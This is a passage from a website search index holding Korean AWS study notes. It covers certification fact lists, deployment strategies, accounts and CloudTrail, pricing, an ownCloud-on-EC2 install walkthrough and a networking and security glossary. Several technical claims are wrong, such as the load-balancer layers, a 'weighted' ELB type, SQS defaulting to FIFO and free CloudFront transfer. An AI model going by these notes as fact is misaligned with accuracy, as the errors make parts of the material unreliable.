걸쳐 6개 저장\n  RDS 속도 Aurora \u0026gt; PostgreSQL \u0026gt; MySQL\n  RDS가 허용하는 최대 백업 보존기간은 최대 35일\n  다중 RDS 설정은 보조 데이터베이스를 통해 재해 복구 및 데이터 증복성을 제공\n  읽기 전용 복제본 RDS는 일기 성능 및 네트워크 대기 시간, 비동기 복제, 확장성을 위함\n  복제본 설정에서 전용 복제본은 5개가 제공\n  DynamoDB는 푸시 버튼 스케일링 제공 및 인스턴스 크기는 런타임에의해 선택, SSD 스토리지 사용 및 3개 이상의 지역에 분산되어 있음, 일관된 읽기를 제공\n  Amazon SWF란 Simple Workflow로 간단한 워크 플로를 의미\n  워크 플로는 언어 제한을 두지 않음\n  워크 플로는 AWS 전용 API를 쓰지는 않지만 API를 사용하기는 하며 표준 HTTP 요청 및 응답을 지원\n  SWF는 simple Workflow로 AWS의 관리 서비스로 응용 프로그램 구성 요소에서 작업을 처리하고 조정 가능, 동기적, 비동기적으로도 통신\n  SWF 작업은 한 번만 할당됨\n  Amazon SES는 Simple Email Service로 AWS 애플리케이션 및 서비스의 이메일을 주고 받는 데 사용 됨\n  SQS 단순 대기열 서비스로 메시징에 중점을 두고 있음\n  SNS는 단순 알람 서비스 밋 푸시, SQS는 풀 서비스\n  SQS는 워크 로드를 통해 풀은 진행\n  SNS는 아마존 서비스 별로 표현 되어짐\n  SWF에 작업 과정 모음을 워크 플로라 하며 도메인이 여기 속함\n  SQS 대기열은 선택 가능 기본적으로 FIFO로 보내려고 시도만 할 뿐임 FIFO는 아님\n  NACL은 상태 비 저장 규칙이며 인바운드 및 아웃 바운드에 대해 존재 필, 보안 그룹은 상태 저장이 가능\n  VPC의 CIDR은 /16이지만 서브넷은 /20 사용자 지정 VPC는 알아서 생성하는 것\n  VPC는 모든 발신 트래픽만 허용\n  VPC는 탄력적 네트워크르 인터페이스를 제공하는 인터페이스 엔드 포인트 및 IP 주소와 라우팅 테이블로 만든 게이트웨이 엔드 포인트가 있음\n  보안그룹은 인스턴스 수준에서 운영되어짐\n  보안그룹은 모든 규칙의 평가를 진행\n  기본 VPC 값은 5개가 최대\n  bastion host는 ssh를 가능하게 하는 것\n  기본적으로 NAT 인스턴스 \u0026lt; NAT 게이트웨이\n  전용 호스팅 테넌시는 기본 호스팅으로 변경될 수 없으면, VPC를 재 생성해야함\n  인스턴스의 모든 메타 데이터는 [IP]/latest/meta-data에 존재\n  S3 실수로 삭제하게 된 경우 버전 관리 및 MFA 삭제를 활성화 하면 됨\n  리전당 최대 인스턴스의 수는 20개\n  스케쥴링 쿨 타운 타이머 수정시 임계 값 변동 가능\n  CloudWatch는 디스크 읽기 작업,CPU 사용량 및 인바운드 네트워크 트래픽을 제공 ( 기본적으로 메모리 사용량은 제공 X )\n  공개 인터넷은 0.0.0.0/0을 통해 주소가 지정\n  RDS 인스턴스에서 보조 RDS 인스턴스로 데이터를 복제할 때는 1차에서 2차 데이터 복제에 대한 요금이 없음\n  RDS 복제본은 Aurora는 지원하지 않음\n  읽기전용 복제본은 최대 5개\n  읽기 전용은 성능과 확장성, AZ는 재해 복구 및 내 결함성\n  EC2는 공식적으로 28개의 첨부파일을 가질 수 있음 즉 28 -1 = 27\n  마케팅 캠페인으로 인해 앱에 대한 트래픽이 증가할 경우, ElastiCache를 사용하여 캐시 및 복제본 구성을 설정하여 트래픽을 분산\n  클러스터 배치 그룹은 단일 가용 영역 내에 존재하는 인스턴스로 구성되어야 하며, 이러 인해 네트워크 활동의 처리량이 증가\n  확산 배치 그룹은 여러 가용 영역에 최대 7개의 인스턴스를 가질 수 있으며, 네트워크 대기 시간을 줄임\n  프로비저닝된 IOPS의 볼륨은 16TB의 스토리지를 허용\n  SSD 지원 볼륨은 I/O 크기 읽기 및 쓰기 작업이 있는 트랜잭션 워크로드에 최적합\n  Elastic Load Balancing의 옵션은 클래식 로드 밸런서, 응용 프로그램 부하 분산, 가중로드 밸런서가 있음.\nELB의 옵션에는 ELB와 ALB가 있음\n  ALB는 TCP의 7레벨에서 작동\n  네트워크 로드 밸런서는 TCP의 레벨 4에서 작동\n  클래식 로드 밸런서는 TCP의 레벨1, 4에서 작동\n  SSL 한개로 여러 개 돌리면 ALB, SSl 종료는 ALB, ELB모드 지원\n  route 53의 기본 도메인은 50개, 요청에 따라 증감 가능\n  route 53은 존 에이펙스 레코드 ( 네이 키드 )를 지원함\n  ElastiCache는 캐싱을 위해 memcached와 redis의 두 가지 엔진을 사용\n  ElastiCache는 메모리 데이터 저장소, 샤딩 애플리케이션 요구를 위한 매커니즘을 의미\n  CloudFront 배포와 상호 작용하는 데는 CloudFormation, AWS CLI, AWS REST API 및 AWS가 제공하는 다양한 SDK를 통해 상호 작용이 가능\n  CloudFRONT의 전송비용은 무료\n  Edge는 기본적으로 24시간마다 업데이트 된 내용을 학인하지만, 값의 변경이 가능\n  CloudFront는 0초의 만료 기간을 갖도록 할 수 있으며, 캐싱이 발생하지 않음을 의미 ( 모든 콘텐츠가 만료 되어짐 )\n  무효화 API를 사용하여 CloudFront를 즉시 객체 제거 가능\n  일반적으로 CLacier의 데이터 검색은 3~ 5시간이 걸림\n  S3와 S3-IA의 차이는 엑세스 빈도를 의미 검색의 속도는 동일\n   "});index.add({'id':116,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/%EB%B0%B0%ED%8F%AC/','title':"배포",'content':"배포 ( Deploy )    배포 ( Deploy )  무중단 배포  서비스를 배포시 ( 버전 업데이트 등 ) 서버를 중단하지 않고 배포( 업데이트 )를 진행하는 것   중단배포( Ice breaking )  서비스를 배포시 서버를 중단하고 배포를 진행하는 것 ( 서버 정기 정검 )   In-Place Deployment  \rIn-Place Deployment\r...\r\r In-Place Deployment    한 개의 로드밸런서가 4개의 서버로 요청을 보내고 있으며, 현재 1.0.1의 버전을 사용하고 있다. 만약 여기서 1.0.2로 버전을 업데이트 하는 경우    로드밸런서와 Server 1, Server 2의 연결을 해제한다. 로드밸런서는 Server 3와 Server 4로만 요청을 보내게 된다.    나머지 Server 두개를 버전 1.0.2로 업데이트 한다.    업데이트한 서버를 로드밸런서에 연결한다.    앞의 과정을 반복한다.     IN-Place Deployment는 현재 사용 가능한 자원을 그대로 사용하여 무중단 배포를 할 수 있다는 장점이 있다. 하지만 본래 4개의 서버가 2개만 돌아가는 만큼 가용서버가 적어져 부하가 걸릴 수 밖에 없다. 만약 롤백을 해야하는 경우 시간적인 소모가 길어 작업에 차질이 생길 수 있다. \r\r\r\r  Blue-Green Deployment  \rBlue-Green Deployment\r...\r\r Blue-Green Deployment\n   블루/ 그린 배포의 원리도 간단하다. 블루/ 그랜 배포는 현재 무중단의 기본 원칙인 구버전과 신버전이 동시에 떠 있어도 아무런 문제가 없어야 한다는 것이지만, 두 버전이 동시에 떠 있어서 발생하는 예쌍치 못한 장애의 위험을 더 줄일 수 있다. 현재위치 배포의 단점을 어느 정도 보완할 수 있는 방법으로, 현재위치 배포에서 했던 것과 비슷하지만 이번에는 4개의 서버가 하나의 그룹에 들어가 있다는 전제로 설명해보겠다.    기존의 서버그룹과 같은 서버그룹을 복제한다.    복사한 서버그룹 내부의 서버들에 업데이트를 진행한다.    업데이트가 진행된 복사한 서버그룹을 로드밸런서에 연결한다.    업데이트가 진행된 복사한 서버그룹을 로드밸런서에 연결한다.     이러한 과정을 거치면 온전하게 서버를 이용할 수 있으며, 서버 또한 제대로 업데이트 되어진 장점이 있다. 하지만 만약 서버가 클라우드나 가상환경이 아닌, 물리적인 서버일 경우, 기존의 서버를 그대로 복사하는 것을 사실상 불가능하며, 비 효율적일 수 밖에 없어 함부로 선택할 수 없다.   서버 내 Blue/ Green Deployments \r\r\r "});index.add({'id':117,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/aws-%EA%B3%84%EC%A0%95/','title':"AWS 계정",'content':"AWS 계정    AWS의 계정   AWS 상에서 공유하는 리소스 관리단위 단일계정과 복수계정을 활요할 수 있으며, 비교 관점에 따라 각각 운용성과 보안의 장단점이 존재   단일 계정  단순함이 장점이며, 리소스가 집약되어 있기에 초보자가 사용하기 적합 단, 여러 개의 환경을 구축하거나 운용할 때는 문제가 발생, 운용 현장의 경우에는 개발 환경만 이용 가능하고, 작업 권한이 없는 사용자가 필요 AWS는 IAM을 사용해 사용자에게 권한을 제어하고 있지만, 서버 단위 권한을 부여해야 할 경우에는 비효율적   복수 계정  복수 계쩡의 장점은 환경 단위로 계정을 나눌 수 있다는 것으로, 개발용 계정과 운영용 계정을 따로 분리해서 각기 이용하는 사용자를 나눌 수 있음 운용 측면에서 매우 큰 장점이라 할 수 있음     AWS의 감사 추적    AWS의 감사 추적  감사추적이란 시스템의 작업 이력 및 상태를 감사자가 추적할 수 있는 기록 감사추적은 크게 AWS 자체의 작업 상태와 이력, AWS 내의 리소스로 나뉘어짐   AWS 자체의 작업 상태와 이력  AWS는 브라우저로 관리 콘솔 화면 또는 API를 이용해서 작업을 진행 AWS 자체 감사 추적의 기본은 AWS Config와 AWS CloudTrail Service가 있으며 이 두가지 서비스를 통해 AWS 서비스의 감사 추적 기록을 취득할 수 있음  Config  \rConfig\r...\r\rConfig    AWS 리소스의 구성 변경 사항을 지속적으로 모니터링 및 기록 가능 AWS 리소스의 목록을 생성 및 AWS 리소스를 구성할 뿐 아니라, 특정 시점의 EC2 인스턴스 내에 소프트웨어를 구성을 도와줌 Amazon Simple Notification Service ( SNS ) 알리 사용 가능 \r\r\r\r  CloudTrail  \rCloudTrail\r...\r\rCloudTrail     AWS 계정 내에서 이루어지는 모든 작업과 활동에 대해 기록하는 서비스\n  계정 내에서 이루어지는 API 호출도 모두 기록함\n  AWS 계정 생성시 자동으로 활성화되며 최대 90일간의 기록을 볼 수 있음\n  최근 이벤트를 확인할 수 있는 이벤트 기록, ‘추적’ 기능, Insight 이벤트로 이루어짐\n   추적\n  ‘추적’을 활성화하면 모든 리전 혹은 선택한 리전에 대하여 활동기록을 기록하고 S3 Bucket에 보관할 수 있음\n  Organization와 연동하여 사용가능하며 자신의 ‘조직’을 선택하면 조직 내 모든 계정을 추적할 수 있음\n  Insight 이벤트는 write API 호출에 관련된 비정상적인 호출을 탐지함\n  \r\r\r  AWS 내의 리소스  AWS 내의 리소스에 대해서는 인스턴스 ( 가상 서버 )나 DB 인스턴스 ( 가상 데이터 베이스 서버 ) 등이 주된 대상 기본적으로 온프레미스와 같은 방법으로 취득하는 경우가 많음 매니지먼트 ( 관리형 ) 서비스라고 불리는 일부 서비스의 경우, OS 부분의 관리를 AWS가 수행하기 때문에 로그를 취득하기 위해 AWS가 제공하는 방식을 따라야 함  "});index.add({'id':118,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/aws%EC%9A%94%EA%B8%88/','title':"AWS 요금",'content':"AWS 요금   AWS의 요금  AWS는 기본적으로 종량 요금제이지만 일부는 무료로 이용이 가능 요금 체계는 서비스 마다 다르지만, 원칙이 존재   AWS의 요금체계  AWS는 기본적으로 종량 요금제 ( 사용한 만큼 금액을 지불하는 방식 ) 종량 과금에는 시간 기준, 횟수 기준, 용량 기준의 3가지 종류가 있으며, 이 가운데 하나 혹은 조합의 이해 요금이 측정  EC2의 경우 CPU, 메모리 등의 조합으로 한 시간단위로 이용량이 결정되어짐      네트워크 과금의 방식  네트워크 과금의 사고 방법에는 수신과 송신이 존재 외부 네트워크에서 AWS로 통신을 수신, AWS에서 외부 네트워크로 송신이라 하며 수신은 기본적으로 무료이지만 송신에 대해서는 1GB당 얼마라는 계산 방식으로 과금이 측정되어짐 수신은 무료이므로 온프레미스 서버의 데이터를 AWS에 백업하는 방식은 통신료가 무료이며, 데이터 복원 등의 이유로 그 데이터를 온프레미스로 송신할 때만 과금이 발생      횟수 기준에 따른 방식  횟수 기준에 따른 과금은 API 호출 횟수를 기준으로 계산  Amazon SQS라는 큐 서비스는 표준 큐의 경우 100만 건의 API 요청에 $0.4가 과금   스토리지 서비스 S3와 같은 경우는 PUT, COPY, LIST의 요청이 1.000건에 $ 0.0047인 것에 비해 GET 요청은 10.000건에 $ 0.0037로 호출하는 API에 따라 가격 설정이 다른 경우가 많음      조합형 과금  여러 체계의 과금이 겹쳐져서 비용이 지불되는 경우  S3의 1개월간의 데이터 스토리지 이용량과 API 호출 횟수로 과금        AWS 요금 계산기 ( Simple Monthly Calculator )    AWS 요금 계산  AWS 요금 계산 사이트   "});index.add({'id':119,'href':'/docs/cloudcomputing/awstraining/owncloud/','title':"AWS OwnCloud",'content':"Nas-Owncloud 실습    Owncloud를 활용하여 Ec2 Nas 만들기        EC2 생성\n\u0026gt; OS : Ubuntu 18.04\r\u0026gt; Flavor : t2.micro\r\u0026gt; Storage : 100G ( 원하는 만큼, 차후에 EFS 등으로도 가능합니다. )\r\u0026gt; VPC : Custop\r\u0026gt; 보안그룹 : Custop\r 인스턴스를 생성합니다.      먼저, Owncloud를 사용하기 위해서는 LAMP를 설치해야합니다.  $ sudo apt install -y tasksel\r$ sudo tasksel install -y lamp-server\r# LAMP 간편 설치\r$ sudo apt install -y apache2\r# apache2 설치\r$ sudo apt install -y mysql-server\r# mysql 설치\r$ sudo apt install -y php7.2\r$ sudo apt install -y libapache2-mod-php7.2\r$ sudo apt install -y php-mysql\r# php 및 연동모듈 설치\r$ apache2 -v\r$ mysql --version\r$ php -v\r# 확인\rLAMP란?    $ wget -nv https://download.owncloud.org/download/repositories/10.0/Ubuntu_18.04/Release.key -O Release.key\r$ apt-key add - \u0026lt; Release.key\r$ echo \u0026#39;deb http://download.owncloud.org/download/repositories/10.0/Ubuntu_18.04/ /\u0026#39; | sudo tee /etc/apt/sources.list.d/owncloud.list\r# Ubuntu의 기본패키지에는 Owncloud가 지정되어 있지 않음  Owncloud 저장소 지정     $ sudo apt -y update\r$ sudo apt -y upgrade\r$ sudo apt -y install php-bz2 php-curl php-gd php-imagick php-intl php-mbstring php-xml php-zip owncloud-files\r$ ls -l /var/www/owncloud/\r# 확인\r Owncloud 설치     $ mysql -u root -p\r$ mysql\u0026gt; CREATE DATABASE [ DB 이름 ];\r$ mysql\u0026gt; GRANT ALL ON [ DB이름 ].* to \u0026#39;[ 계정 ]\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;[ PW ]\u0026#39;;\r$ mysql\u0026gt; FLUSH PRIVILEGES;\r$ mysql\u0026gt; exit\r owncloud DB 및 원격접속 계정생성     $ sudo vi /etc/apache2/apache2.conf\r\u0026lt;Directory /var/www/owncloud\u0026gt;\rOptions FollowSymlinks\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r apache2.conf에서 owncloud에 대한 접근 권한을 설정합니다.     $ sudo vi /etc/apache2/sites-available/000-default.conf\rDocumentRoot /var/www/html\r\u0026gt; DocumentRoot /var/www/owncloud\r apache2의 기본 경로를 수정합니다.     $ sudo mkdir /data\r$ sudo chmod 0770 /data\r$ sudo chown www-data:www-data /data\r# owncloud 사용을 위한 권한 및 소유자 변경\r 저장의 사용할 폴더를 미리 만들어 둡니다.     $ sudo systemctl restart apache2\r$ sudo service apache2 restart\r apache2를 재시작합니다.      http://IP를 통해 접속합니다. 알맞은 값을 기입 후 설치를 완료합니다.      설치가 완료되면, 루트계정을 통해 접속합니다.      설치가 완료되었습니다.      Elastci IP 를 주어 고정시킬 수 있고, 방화벽, 보안그룹의 설정을 통해 특정 IP만을 접속하게 할 수 있습니다. 다음은 owncloud를 커스터마이징 해보도록 하겠습니다.     Owncloud 설정   도메인 등록\n$ vi /var/www/owncloud/config/config.php\rarray (\r0 =\u0026gt; \u0026#39;IP\u0026#39;\r1 =\u0026gt; \u0026#39;Domain\u0026#39;\r)\r 도메인 접근 허용 설정  "});index.add({'id':120,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/basic/','title':"Base",'content':"AWS 용어 정리   AWS 기본 용어  Workloads\n 고객 대면 애플리케이션이나 백엔드 프로세스 같이 비즈니스 가치를 창출하는 리소스 및 코드 모음을 의미    On-premise\n 클라우드 방식이 아닌, 회사 등이 자체적으로 보유한 전산실 등의 인프라를 의미   Edge Location\n  CDN( Contents Delivery Network ) 서비스인 CloudFront 가 사용하는 캐시서버\n  전 세계의 분포되어 있으며 Edge Location 끼리 데이터를 공유\n   Elasticity ( 탄력성 )\n AWS의 상징과도 같으며 Autoscaling 처럼 단 시간에 갑작스러운 요구에 따라 사용량을 늘리거나 줄이는 것을 의미 ( Scale out )   Scalability ( 확장성 )\n 장기적인 관점 ( 아키텍처적인 관점 )에서 예상치를 충분히 감당할 수 있는 리소스를 보유하는 것을 의미 ( Scale in )    AWS Key  Key Management System  Key Management System는 말 그대로 ‘Key’를 관리하는 시스템으로 데이터를 암호화하고 복호화하는 기능을 담당 EBS, S3, RDS, EFS, SNS 등의 서비스에서 데이터 암/ 복호화 기능을 제공 즉 다른 서비스와 통홥되어 사용됨 KMS를 사용하여 암호화를 관리할 경우 키가 외부로 유출되는 위험이 적으며, AWS가 직접 키의 안전을 책임짐 다음 3가지 유형의 키로 나뉨  AWS 관리형 키 고객 관리형 키 사용자 키 스토어     고객 마스터 키 ( Customer Master Key, CMK )  데이터 키의 생성에 관여하는 키 AWS 서비스가 암호화를 시작할 때 CMK의 생성을 요청한 후 데이터 암호화 시작 즉, CMK를 생성한 후에 데이터 키를 생성하고 데이터 암호화를 시작 위의 3가지 유형 키는 CMK를 누가 관리하느냐에 따라 달라짐   데이터 암호화 과장  먼저 암호화를 시작하고자 하는 서비스가 CMK의 생성을 요청 CMK가 생성되고 이를 통해 데이터를 직접적으로 암호화할 데이터 키( 대칭키 ) 생성 데이터를 데이터 키( 대칭키 )로 암호화한 후, 데이터 키를 폐기 데이터 키( 대칭 키)를 마스터 키로 암호화하여 암호화한 데이터와 같이 동봉 ( 봉투 암호화 ) 서비스가 암호화된 데이터를 다시 복호화하여 사용하고자 할 경우 고객 마스터 키를 가지고 데이터 키를 복호화 한 뒤 이 데이터 키를 가지고 데이터를 복호화함 즉, CMK에 대한 접근권한이 없다면 데이터를 복호화 할 수 없음 CMK를 삭제하게 되면 데이터를 복호활 길은 전혀 없음   AWS 관리형 키 ( CMK )  AWS가 직접 CMK를 생성, 관리하는 서비스 사용자가 CMK에 대한 제어권한이 없음 AWS가 주기적으로 CMK를 변경하여 사용 고객 관리형 키를 쓰고 있지 않은데, 암호화를 사용중이라면 AWS 관리형 키를 이용해 암호화하고 있는 것   고객 관리형 키 ( CMK )  고객이 직접 CMK를 생성하고 관리하는 서비스 키의 화설화, 비활성화, 삭제 등 제어권한을 가짐 IAM을 이용하여 CMK에 접근할 주체를 정할 수 있음   사용자 지정 키 스토어  CMK를 KMS가 아닌 CloudHSM에 저장하여 사용하는 방식 CloudHSM 클러스터가 생성되어 있어야 사용 가능  AMI ( Amzon Machine Image )  인스턴스르 시작하는 데 필요한 정보를 제공하는 이미지 파일과 같은 개념 AMI를 지정하여 인스턴스의 생성이 가능 EBS 지원 AMI와 인스턴스 스토어 지원 AMI로 나누며, EBS 지원 AMI는 EBS 스냅샷에서 루트 디바이스 스토리지가 생성되며, 인스턴스 스토어지원 AMI는 S3에 저장된 템플릿에서 생성된 스토어 볼륨을 사용 AMI와 연결된 스냅삿은 지울 수 없음 다른 리전으로의 복사가 가능하며 권한을 준다면 다른 계정과도 공유가 가능 AWS Market place 에서 다른 사람이 만들어둔 AMI를 쓰거나 공유가 가능   스냅샷과 EBS  스냅샷을 이용하여 EBS 볼륨의 데이터를 S3에 저장할 수 있음, 증분식 백업이기 때문에 스냅샷은 하나이며 마지막 스냅샷 이후 변경된 블록만 추가적으로 저장됨 각 스냅샷에는 스냅샷을 만든 시점의 데이터를 새 EBS 볼륨에 복원하는 데 필요한 정보가 들어 있음 EBS의 스냅샷은 S3에 저장되며 S3에 저장된 스냅샷으로 EBS 볼륨 복구 가능 암호화된 볼륨의 스냅샷은 자동으로 암호화 암호화된 스냅샷에서 생성되는 볼륨은 자동으로 암호화 암호화되지 않은 EBS에서 암호화된 스냅샷은 생성할 수 없음   EBS의 암호화  EBS를 암호화함으로써 부팅 및 데이터 볼륨을 모두 암호화 할 수 있음 암호화 유형의 데이터: 볼륨 내부 데이터, 볼륨과 인스턴스 사이에서 이동하는 데이터, 볼륨에서 생성된 모든 스냅샷, 스냅샷에서 생성된 모든 불륨 ( 스냅샷 암호화시 스냅샷에서 생성된 볼륨을 자동 암호화 ) AE#S -256 알고리즘 사용  RAID 구성  RAID 0: I/O 성능이 내결함성보다 더 중요한 경우 RAID 1: I/O 내 결함성이 성능보다 더 중요한 경우  Elastic IP  EC2에 설정되는 네트워크 인터페이스의 기본 IP EC2가 기본적으로 가지고 있는 Public IP와 Private IP 와는 다르며, 구분이 필요 Elaticitic IP를 사용하면 EC2로 하여금 중지되었다가, 다시 시작되더라도 고정된 공인 IP를 사용하게 할 수 있음 Elastic IP는 계정 내에 최대 5개까지 보유 가능하며, 그 이상 필요시 AWS에 요청필요 프리티어의 경우, 사용 중이 아닐 때는 요금이 부과됨   Key pair  EC2는 SSH 접속 시 Key pair 라고 하는 퍼블릭 키 암호화 기법을 사용하여 접속하여 로그인 정보를 암호화 및 해독 key pair 분실시 접속 불가   Elastic IP  EC2에 설정되는 네트워크 인터페이스의 기본 IP EC2가 기본적으로 가지고 있는 Public IP와 Private IP 와는 다르며, 구분이 필요 Elaticitic IP를 사용하면 EC2로 하여금 중지되었다가, 다시 시작되더라도 고정된 공인 IP를 사용하게 할 수 있음 Elastic IP는 계정 내에 최대 5개까지 보유 가능하며, 그 이상 필요시 AWS에 요청필요 프리티어의 경우, 사용 중이 아닐 때는 요금이 부과됨   Cipher Suite  암호화 세팅 ( 암호화 프로토콜 ) – 키교환 방식 – 인증서 검증 – WITH – 암호화 알고리즘 ( Cipher ) – 메시지 인증방식 ( 공개 키 ) 키교환 방식: 인증서를 전달 받은 Client가 serve에게 전달할 세션키(pre-master key \u0026lt; - 양측의 Random byte를 이용해 만든 Key )를 공개키 알고리즘에 따라 서버의 공개키로 암호화할 때 사용할 방식 인증방식 Client는 받은 서버의 인증서가 신뢰할 수 있는 지 검토 후 공개키를 추출 먼저 서명자는 문서의 데이터 일부를 해시 함수를 이용해 해시 값을 생성하고, 이를 개인키로 암호화한 뒤 문서에 첨부 Client는 이 인증서를 공개키로 복호화 한 뒤, 개인키로 암호화된 해시 값 역시 공개키로 복호화 인증서 내부 데이터를 같은 해시 함수를 이용해 해시 값을 얻어냄, 이 2가지를 비교하여 인증서를 검증 ( 대칭 키 알고리즘, 해쉬 알고리즘 ) 암호화 알고리즘: Application Data를 암호화 하기 위한 알고리즘   MAC  무결성 확인용 인증방식 메시지 데이터 일부를 MAC 알고리즘으로 변환하여 메시지에 첨부한 후 수신자가 똑같은 방식으로 변환, 일치 여부를 검사   OAI ( Origin Access Identity )  S3를 오리진 서버로 사용시, CloudFront를 제외하고 다른 경로로 S3를 접근하는 것을 막는 방법 OAI를 설정하게 되면 각각의 Distribution이 별도의 Identity를 갖게 되며, S3의 버킷 정책을 수동 혹은 자동으로 수정할 수 있음 OAI가 적용된 S3의 버킷정책은 수정됨   Presigned URL  인증된 사용자만이 해당 Distribution을 사용할 수 있도록 제어하는 기능 만료 날짜 및 시간까지 설정 가능 CloudFront 설정 시 Presigned URL 사용과 CloudFront Key pair를 계정의 보안자격 증명에서 생성해야 함 이를 조합하여 URL 서명을 생성하고 해당 URL을 통해 CloudFront에 접근할 수 있음   Snapshot  DB 인스턴스의 특정시점을 스냅샷으로 생성하는 것 자동백업과 마찬가지로 스냅샷 역사 자동으로 생성이 가능하며, 수동으로도 생성 가능 자동백업과는 달리 스냅샷 생성시점으로만 복원가능 스냅샷으로 복원시 DB 인스턴스를 복원하는 것이 아닌 개별 DB 인스턴스가 생성됨 ( DB 스냅샷에서 기존 DB 인스턴스로 복원은 X, 새로운 DB 인스턴스가 생성 ) 스납샷 복사, 공유, 마이그레이션이 가능 스냅샷 생성 중에는 소토리지 I/O가 일시적으로 중단 될 수 있음 ( Multi-AZ 사용시 Standby 에서 백업 실시 )   스냅샷과 EBS  스냅샷을 이용하여 EBS 볼륨의 데이터를 S3에 저장할 수 있음, 증분식 백업이기 때문에 스냅샷은 하나이며 마지막 스냅샷 이후 변경된 블록만 추가적으로 저장됨 각 스냅샷에는 스냅샷을 만든 시점의 데이터를 새 EBS 볼륨에 복원하는 데 필요한 정보가 들어 있음 EBS의 스냅샷은 S3에 저장되며 S3에 저장된 스냅샷으로 EBS 볼륨 복구 가능 암호화된 볼륨의 스냅샷은 자동으로 암호화 암호화된 스냅샷에서 생성되는 볼륨은 자동으로 암호화 암호화되지 않은 EBS에서 암호화된 스냅샷은 생성할 수 없음f   Elastic Network interface ( ENI )  가상 네트워크 인터페이스 VPC 내 리소스들은 ENI와 사설 IP를 기본적으로 할당받음 ( 선택적으로 공인 IP도 할당 가능, Public Subnet의 경우, 리소스 생성시 자동으로 공인 IP를 할당 ) 사설 IP 주소는 추가로 할당 가능하며 공인 IP 역시 나중에 할당 가능   Routing Talbe  서브넷 내의 트래픽이 전송되는 위치를 결정하는 라우팅의 규칙 집합 라우팅 테이블은 기본적으로 VPC의 범위에 해당하는 범위를 기본 라우팅으로 가지며( ex. 172.16.1.0/24 ) 이를 ‘Local’로 표시함 Internet Gateway, NAT gateway, VPC Endpoint, Peering 등을 설정하고 그 서비스로 트래픽을 보내도록 라우팅 설정할 수 있음 ‘0.0.0.0/0’은 default routing을 뜻하며 트래픽이 가고자 하는 목적지가 라우팅 테이블에 없는 경우( ex. 172.16.1.0/24 네트워크에서 외부 인터넷으로 나아가고자 할 때 ) 사용하는 라우팅이며 보통 Internet Gateway나 NAT Gateway로 외부 인터넷을 지정할 때 씀   Internet Gateway  VPC 내 리소스가 외부 인터넷을 사용하고자 할 때 사용하는 게이트웨이 인터넷 게이트웨이가 없으면 외부 인터넷을 사용할 수 없음 인터넷 게이트웨이를 생성한 후, ‘0.0.0.0/0’에 대하여 라우팅 테이블을 인터넷 게이트웨이로 잡아주면 사용 가능 다만 인터넷 게이트웨이가 있다 하더라도, VPC 내 리소스가 공인 IP를 가지고 있지 않다면 인터넷 사용 불가능 또한 위의 설정을 모두 헀음에도 인터넷이 제대로 되지 않는다면, 보안 그룹과 Network ACL을 확인해야 함   NAT Gateway  외부에서의 접촉이 원천적으로 차단되어 있는 Private Subnet에서 인터넷 접속을 통해야 할 경우 사용하는 게이트웨이 VPC 내부 리소스가 NAT Gateway를 통해 인터넷을 접속할 수 있지만, 외부에서 NAT Gateway를 통해 VPC 내부로 들어올 수 없음 인터넷이 견결된 Public subnet에 NET gateway( EIP소유 )를 생성한 후, Private Subnet의 라우팅 테이블에 ‘0.0.0.0/0’에 대하여 라우팅을 NAT gateway로 잡아주면 사용가능 CloudWatch를 이용하여 모니터링 가능   NAT Instance  Public Subnet에 생성된 NAT Gateway 대신 EC2 인스턴스를 사용하는 방법 Public subnet에 공인 IP를 가진 특수한 인스턴스를 게이트웨이로 삼고, Private Subnet의 라우팅 테이블에 ‘0.0.0.0/0’ 에 대하여 NAT Instance를 GATE WAY로 설정한 후, ‘SrcDestCheck’ 속성을 비활성해야 함 커뮤니티 AMI에 이쓴ㄴ ‘ami-vpc-nat’로 시작하는 인스턴스로 사용 가능 인스턴스이기 때문에 후술할 보안그룹의 설정을 적용 받으므로 트래픽을 제어할 수 있음   NAT Instance vs NAT Gateway  NAT Gateway는 AWS에서 관리하기 때문에 유지보수할 필요가 없으나, NAT Instance는 사용자가 직접 관리해야 함 NAT Instance는 인스턴스이기 때문에 장애가 발생할 가능성이 있어, 스크립트로 인스턴스 간 Failover를 신경써야 함 NAT Gateway는 대역폭을 최대 45Gbps까지 확장할 수 있지만, NAT Instance는 인스턴스 유형에 따라 다름 NAT Gateway는 보안 그룹을 사용할 수 없지만, NAT Instance는 보안 그룹을 사용할 수 있음 NAT Gateway와 NAT Instance 모두 NACL을 통해 트래픽 제어 가능   Security Group  VPC 내 인스턴스에 대한 인바운드 및 아웃바운드 트래픽을 제어하는 가상의 방화벽 서브넷 수준이 아닌 인스턴스 수준에서 작동하기 떄문에 각 인스턴스를 서로 다른 보안그룹으로 지정할 수 있음 기본적으로 모든 인바운드 트래픽을 거부하고 모든 아웃바운드 트래픽을 허용 인스턴스당 최대 5개의 보안그룹을 설정할 수 있음 보안그룹의 가장 큰 특성은 이란바 ‘Stateful’로 인바운드 트래픽과 아웃바운드 트래픽에 별도의 규칙을 지정할 수 있는 것 즉 인바운드에는 HTTP ( 80 ) 포트가 허용되어 있으나, 아웃바운드에 없는 경우 HTTP 트래픽이 외부에서 들어왔따가 나갈 때 전혀 지장이 없음 허용 규칙만 존재하며 거부 규칙이 존재하지 않음 Source Ipm Protocol, Port 등을 설정할 수 있음 설정 변경 시 즉시 적용됨   Nettwork ACL  서브넷 내부와 외부의 트래픽을 제어하기 위한 가상 방화벽으로 네트워크 스위치의 ACL과 역할이 같음 서브넷의 가상 방화벽이기 때문에 서브넷에 속한 모든 인스턴스가 영향을 받음 기본적으로 모든 인바운드와 아웃바운드 트래픽을 허용함 하나의 ACL은 다수의 서브넷과 연결될 수 있으며, 하나의 서브넷은 하나의 ACL만 연결됨 Network ACL의 가장 큰 특징은 ‘Stateless’로서 인바운드 규칙과 아웃바운드 규칙이 서로 영향을 줌 즉 인바운드에는 HTTP( 80 )포트가 허용되어 있으나, 아웃바운드에 없는 경우 HTTP 트래픽이 외부에서 들어왔다가 나갈 때 아웃바운드 통신이 되지 않음 허용과 거부 모두 가능 Security Group과 달리 우선순위 값이 존재하며 가장 작은 값이 가장 높은 우선순위를 가지고 우선순위부터 순서대로 적용 변경 사항은 잠시 후 적용   Security Group vs 